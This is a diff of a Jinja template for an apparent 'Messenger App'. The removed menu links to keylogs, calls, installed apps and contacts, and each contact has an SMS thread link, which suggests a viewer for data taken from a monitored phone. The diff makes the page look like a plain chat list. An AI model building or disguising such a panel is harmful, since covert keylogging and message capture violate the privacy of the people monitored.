@@ -1,54 +1,45 @@
 {% extends "base.html" %}
 
-{% block title %}Messenger App{% endblock %}
+{% block title %}Chats{% endblock %}
 
 {% block content %}
-<div class="container">
-    <h1>Chats</h1>
-    
-    <div class="search-container">
-        <input type="text" id="search-input" placeholder="Search messages..." onkeyup="searchMessages()">
-        <div id="search-results"></div>
+<div class="section active" id="chats">
+    <div class="top-bar">
+        <h1>Chats</h1>
+        <div class="right-icons">
+            <i data-feather="edit-2"></i>
+            <i data-feather="more-vertical"></i>
+        </div>
     </div>
 
-    <div id="conversation-list">
+    <input type="text" id="search" placeholder="Search in Messenger">
+    <div id="search-results"></div>
+
+    <div class="chat-list">
         {% for contact in contacts %}
-        <div class="contact-card" data-contact="{{ contact['name'] }}">
-            <div class="profile-picture">{{ contact['name'][:2].upper() }}</div>
-            <div class="contact-header">
-                <span class="contact-name">{{ contact['name'] }}</span>
-                <div class="contact-links">
-                    <a href="{{ url_for('chat', name=contact['name']) }}" class="contact-link">
-                        <i data-feather="message-square"></i>
-                        Chat
-                    </a>
-                    <a href="{{ url_for('sms_thread', name=contact['name']) }}" class="contact-link">
-                        <i data-feather="message-circle"></i>
-                        SMS
-                    </a>
+        <div class="chat-item">
+            <div class="profile-picture">{{ contact['name'][:1].upper() }}</div>
+            <div class="chat-details">
+                <div class="chat-header">
+                    <span class="name">{{ contact['name'] }}</span>
+                    <div class="actions">
+                        <a href="{{ url_for('chat', name=contact['name']) }}" class="action-link">
+                            <i data-feather="message-square"></i>
+                        </a>
+                        <a href="{{ url_for('sms_thread', name=contact['name']) }}" class="action-link">
+                            <i data-feather="message-circle"></i>
+                        </a>
+                    </div>
                 </div>
+                {% if contact['last_message'] %}
+                <p class="preview">{{ contact['last_message']|truncate(50) }}</p>
+                {% endif %}
             </div>
+            {% if contact['time'] %}
+            <span class="time">{{ contact['time'] }}</span>
+            {% endif %}
         </div>
         {% endfor %}
-    </div>
-
-    <div class="menu-buttons">
-        <a href="{{ url_for('calls') }}" class="menu-button">
-            <i data-feather="phone"></i>
-            <span>Calls</span>
-        </a>
-        <a href="{{ url_for('keylogs') }}" class="menu-button">
-            <i data-feather="key"></i>
-            <span>Keylogs</span>
-        </a>
-        <a href="{{ url_for('installed_apps') }}" class="menu-button">
-            <i data-feather="grid"></i>
-            <span>Apps</span>
-        </a>
-        <a href="{{ url_for('contacts_list') }}" class="menu-button">
-            <i data-feather="users"></i>
-            <span>Contacts</span>
-        </a>
     </div>
 </div>
 {% endblock %}
